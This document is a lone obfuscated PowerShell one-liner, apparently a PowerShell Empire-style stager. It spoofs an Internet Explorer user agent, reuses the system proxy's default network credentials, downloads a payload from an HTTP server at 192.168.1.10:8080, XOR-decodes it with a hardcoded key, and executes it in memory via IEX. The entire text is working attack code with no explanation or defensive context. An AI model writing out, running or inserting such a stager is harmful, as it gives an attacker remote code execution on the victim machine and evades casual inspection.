
$wC=NEW-Object SyStEm.Net.WeBClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEadERS.ADD('User-Agent',$u);$wC.PRoxY = [SySTeM.NEt.WEBReqUEst]::DefAuLTWebPrOXY;$Wc.PRoxY.CReDeNtIaLS = [SySTEM.NeT.CReDENtIAlCACHe]::DeFauLTNEtWOrkCREDEnTiAlS;$K='PKXUW7+@ardzS-Jx]nw0H2gm)yb.osC[';$I=0;[CHAr[]]$B=([chaR[]]($WC.DownLOadSTriNG("http://192.168.1.10:8080/index.asp")))|%{$_-BXOR$k[$i++%$K.LeNgth]};IEX ($B-jOiN'')

